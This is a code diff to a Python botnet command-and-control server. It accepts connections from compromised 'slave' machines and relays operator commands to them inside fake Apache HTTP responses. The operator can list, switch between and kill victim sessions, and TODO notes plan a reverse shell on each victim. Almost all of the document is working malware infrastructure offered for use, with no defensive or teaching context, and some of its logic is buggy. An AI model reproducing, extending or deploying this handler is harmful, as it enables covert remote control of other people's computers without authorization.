@@ -11,6 +11,7 @@ import re
 import base64
 import signal
 import hashlib
+from tabulate import tabulate
 # from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 
 slaves = {}
@@ -25,32 +26,49 @@ master = {}
 #     Usage of UP and DOWN arrow keys to switch between history
 #     Find a way to use dictonaries rather than queues
 
+'''************************UPDATE THIS*****************************
+1: parent and child pipe has been created for sending and recieving the data for receiving the data from executer.
+2: find a way to send shell on the victim
+3: write a thread to get a shell from the victim.
+'''
+
+EXIT_FLAG = False
+
 def nodeHash(host, port):
-    return md5("%s:%d" % (host, port))
+    data = ("%s:%d" % (host, port)).encode()
+    return hashlib.md5(data).hexdigest()
 
 
 class Slave():
-    def __init__(self,client):                              # initialize all the details of this class
+    def __init__(self,client,position):                              # initialize all the details of this class
+        
         self.client = client
         self.hostname, self.port = client.getpeername()
+        self.position = position
         self.node_hash = nodeHash(self.hostname,self.port)
-        self.parent_pipe, self.new_process = self.createConnectionProcess() 
+        self.cmd_queue = queue.Queue()
+        self.cmd_parent_pipe,self.result_child_pipe, self.new_process = self.createConnectionProcess() 
 
     def killProcess(self):
-        self.client.shutdown(socket.SHUT_RDWR)
-        self.client.close()
+        # self.client.shutdown(socket.SHUT_RDWR)
         self.new_process.terminate()
+        self.client.close()
 
     def addToQueue(self):
         while(True):
-            cmd = self.child_pipe.recv()
-            self.cmd_queue.put(cmd)
+            cmd = self.cmd_child_pipe.recv()
+            if cmd == "lols":
+                lols = list(self.cmd_queue.queue)
+                sys.stdout.write("\n")
+                for item in lols:
+                    sys.stdout.write("{}\n".format(item))
+            else:
+                self.cmd_queue.put(cmd)
 
 
-    def clientExecuter(self,client,child_pipe):
+    def clientExecuter(self,client,cmd_child_pipe,result_parent_pipe):
 
-        self.cmd_queue = queue.Queue()
-        self.pipe_thread = threading.Thread(target=self.addToQueue,args=(,))
+        self.pipe_thread = threading.Thread(target=self.addToQueue,args=())
         self.pipe_thread.start()
         while(True):
             try:    
@@ -60,10 +78,10 @@ class Slave():
                 # sys.stdout.write("[DEBUG] data Recieved\n{}".format(data))
                 send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
                 
-                if (cmd_queue.empty()):
+                if (self.cmd_queue.empty()):
                     cmd = "helloworld"
                 else:
-                    cmd = cmd_queue.get()
+                    cmd = self.cmd_queue.get()
                 cmd_byte = cmd.encode('utf-8')
 
                 if(re.findall('POST',data[:20])):
@@ -79,8 +97,9 @@ class Slave():
                 client.sendall(send_data)
 
             except Exception:
-                proc_name = multiprocessing.current_process().name
-                sys.stdout.write("\nConnection broken from {}:{} in {}".format(self.hostname,str(self.port),proc_name))
+                current_proc_name = multiprocessing.current_process().name
+                sys.stdout.write("\nConnection broken from {}:{} in {}\n".format(self.hostname,str(self.port),current_proc_name))
+                self.removeNode()
                 break
 
         self.pipe_thread.join()
@@ -93,18 +112,17 @@ class Slave():
 
         try:
             while(True):
-                client_cmd = str(input("{}> ".format(process_list[i].name)))
+                client_cmd = str(input("{}> ".format(self.new_process.name)))
                 if(client_cmd == ""):
                     pass
                 elif(client_cmd == "help"):
-                    sys.stdout.write("yolo : exit\nlols : list commands to send\n shell : get rev shell")
+                    sys.stdout.write("yolo : exit\nlols : list commands to send\nshell : get rev shell\n")
                 elif(client_cmd == "yolo"):
                     break
-                elif(client_cmd =="lols"):
-                    break
-                    # Write code here to list all commands needed to send to this connection
+                elif(client_cmd =="lols"):                  # list all commands yet to send to current victim
+                    self.cmd_parent_pipe.send("lols")
                 else:
-                    self.parent_pipe.send(client_cmd)
+                    self.cmd_parent_pipe.send(client_cmd)
         except Exception as ex:
                 sys.stdout.write("\n[-] Unable to Read Command. Reason: {}\n".format(ex))    
 
@@ -112,18 +130,25 @@ class Slave():
     def createConnectionProcess(self):
 
         try:
-            self.parent_pipe, self.child_pipe = multiprocessing.Pipe()        # Creating Pipe for connection to new processes
-            # parent_pipe_list.append(parent_pipe)                    # Appended to list to keep track of parent pipes
-            # host_list.append(client_addr[0])
-            # port_list.append(client_addr[1])
-            self.new_process = multiprocessing.Process(target=self.clientExecuter,args=(self.client,self.child_pipe))
-            # process_list.append(new_process)
+            self.cmd_parent_pipe, self.cmd_child_pipe = multiprocessing.Pipe()        # Creating Pipe for connection to new processes
+            self.result_parent_pipe, self.result_child_pipe = multiprocessing.Pipe()  # Creating Pipe to get the result from the new process
+            self.new_process = multiprocessing.Process(target=self.clientExecuter,args=(self.client,self.cmd_child_pipe,self.result_parent_pipe))
+            
             self.new_process.start()
             sys.stdout.write("\n[+] {}:{} connected as {}".format(self.hostname,str(self.port),self.new_process.name))
             # Created new process for every connection that I get and save the process in process_list
-            return self.parent_pipe, self.new_process
+            return self.cmd_parent_pipe, self.result_child_pipe, self.new_process
         except Exception as ex:
             sys.stdout.write("\n[-] Unable to Create New Process for this Connection {}:{}. Reason: {}\n".format(self.hostname,str(self.port),ex))
+
+        
+    def removeNode(self):
+        try:
+            slaves.pop(self.position)
+        
+        except Exception as ex:
+            sys.stdout.write("\n[-] Unable to Remove Node. Reason: {}\n".format(ex))
+            
 
 
 
@@ -131,15 +156,14 @@ def switch(process_name):
 
     try:
         flag = 0
-        i = 0
-        for i in range(len(process_list)):
-            if(process_list[i].name == process_name):
+        for key in slaves.keys():
+            slave = slaves[key]
+            if(slave.new_process.name == process_name):
                 flag = 1
+                slave.clientCmdShell()
                 break
         if(flag == 0):
-            sys.stdout.write("No process found by the name: {}".format(process_name))
-        else:
-            clientCmdShell(i)
+            sys.stdout.write("\n[Error] No process found by the name: {}\n".format(process_name))
     except Exception as ex:
             sys.stdout.write("\n[-] Unable to Switch Process. Reason: {}\n".format(ex))
 
@@ -148,53 +172,56 @@ def switch(process_name):
 def handlerExecuter(cmd):
 
     try:
-        if(cmd[:4]=='kill'):    # kill specified connection
+        if(cmd[:5]=='kill '):    # kill specified connection
             proc_name = cmd[5:]
             flag = 0
-            for i in range(len(process_list)):
-                if(process_list[i].name == proc_name):
-                    process_list[i].terminate()
-                    del process_list[i]
-                    del parent_pipe_list[i]
-                    del port_list[i]
-                    del host_list[i]
+            for key in slaves.keys():
+                slave = slaves[key]
+                if(slave.new_process.name == proc_name):
+                    slave.killProcess()
+                    slave.removeNode()
                     sys.stdout.write("[+] Process " + proc_name + " is terminated\n")
                     flag = 1
                     break
             if(flag == 0):
-                sys.stdout.write("[-] Process not found\n")
+                sys.stdout.write("[-] Process not found. Please specify name clearly. eg: kill Process-3\n")
+
         elif(cmd[:7]=="killall"):   # kill all conntections
             flag = 0
-            for i in range(len(process_list)):
+            for key in slaves.keys():
+                slave = slaves[key]
                 flag = 1
-                proc_name = process_list[i].name
-                process_list[i].terminate()
-                del process_list[i]
-                del parent_pipe_list[i]
-                del host_list[i]
-                del port_list[i]
+                proc_name = slave.new_process.name
+                slave.killProcess()
                 sys.stdout.write("[+] Process " + proc_name + " is terminated\n")
-            if(flag == 0):
+            if flag == 1:
+                slaves.clear()
+            else:
                 sys.stdout.write("[-] Process not found\n")
+
         elif(cmd[:4] == "list"):    # list all the connected hosts
             # sys.stdout.write("[DEBUG] inside list")
-            for i in range(len(process_list)):
-                proc_name = process_list[i].name
-                hostname = host_list[i]
-                port = port_list[i]
-                sys.stdout.write("{} => {}:{}".format(proc_name,hostname,port))
+            flag = 0
+            for key in slaves.keys():
+                flag = 1
+                slave = slaves[key]
+                sys.stdout.write("{} => {}:{}\n".format(slave.new_process.name,slave.hostname,slave.port))
+            if flag == 1:
+                sys.stdout.write("***List Empty***\n")
         elif(cmd[:6] == "switch"):
             process_name = cmd[7:]
             switch(process_name)
             # sys.stdout.write("[DEBUG] switch")
+
         else:
             sys.stdout.write("\nCOMMANDS:\nlist\t\t\t:\tto list all the connected devices\nkill {processname}\t:\tkill the specified connection\nkillall\t\t\t:\tkill all connected\nswitch {processname}\t:\tswitch to different connection\n")
+    
     except Exception as ex:
             sys.stdout.write("\n[-] Unable to execute Commands. Reason: {}\n".format(ex))
 
 
 def ctrlCHandler(signum, frame):
-    sys.stdout.write("\nctrl-c is pressed to exit type \'exit\'")
+    sys.stdout.write("\nctrl-c is pressed to exit type \'exit\'\n")
 
 def handlerCmdShell():
 
@@ -204,8 +231,11 @@ def handlerCmdShell():
             if(handler_cmd == ""):
                 pass
             elif(handler_cmd == "exit"):
-                sys.stdout.write("[+] Killing all running processes\n")
-                for slave in slaves:
+                EXIT_FLAG = True
+                sys.stdout.write("\n[+] Killing all running processes")
+                for key in slaves.keys():
+                    slave = slaves[key]
+                    # sys.stdout.write("[DEBUG] slave = {}\n".format(slave))
                     time.sleep(0.1)
                     slave.killProcess()
                 time.sleep(2)
@@ -230,26 +260,30 @@ def listener(lhost,lport):
         sock.bind((lhost,lport))
         sock.listen(100)
         # Started the listener which can handle 100 connections.
-        sys.stdout.write ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
+        sys.stdout.write ("\n[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
             
         handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=())
         handler_cmd_thread.start()
         # Handler cmd shell started here.
         # It is running as serperate thread to give us an free cmd shell while listener runs in background.
-        connection_count = 0
-        while(len(process_list)<100):
+        connection_count = 1
+        while(True):
+            repeat = False
+            if EXIT_FLAG:
+                break
             (client,client_addr) = sock.accept()
+            hash = nodeHash(client_addr[0],client_addr[1])
             for i in slaves.keys():         # checking if connection already exists for this client
                 slave = slaves[i]
-                if slave.hostname == client_addr[0]:
+                if slave.node_hash == hash:
                     repeat = True
                     break
-            if repeat:
-                sys.stdout.write("[-] Same Connection Detected\n")
+            if repeat:                      # kill connection if same connection is already up
+                sys.stdout.write("\n[-] Same Connection Detected")
                 client.shutdown(socket.SHUT_RDWR)
                 client.close()
             else:
-                slave = Slave(client)
+                slave = Slave(client,connection_count)
                 slaves[connection_count] = slave
                 connection_count = connection_count + 1
                 # Created new object in class slave and stored in dictonary slaves for every connection
@@ -257,19 +291,27 @@ def listener(lhost,lport):
         sock.shutdown(socket.SHUT_RDWR)
         sock.close()
     except Exception as ex:
-            sys.stdout.write("\n[-] Unable to start a listener. Reason: {}\n".format(ex))
-            os._exit(0)
+        sys.stdout.write("\n[-] Unable to start a listener. Reason: {}\n".format(ex))
+        sys.stdout.write("\n[+] Killing all running processes")
+        for key in slaves.keys():
+            slave = slaves[key]
+            time.sleep(0.1)
+            slave.killProcess()
+        time.sleep(2)
+        sock.shutdown(socket.SHUT_RDWR)
+        sock.close()
+        os._exit(0)
 
 
 def main():
     if(len(sys.argv) < 3):
-        sys.stdout.write("[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
+        sys.stdout.write("\n[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
     else:
         try:
             lhost = sys.argv[1]
             lport = int(sys.argv[2])
             listener(lhost,lport)
-
+            
         except Exception as ex:
             sys.stdout.write("\n[-] Unable to start a handler. Reason: {}\n".format(ex))
             # exit(0)
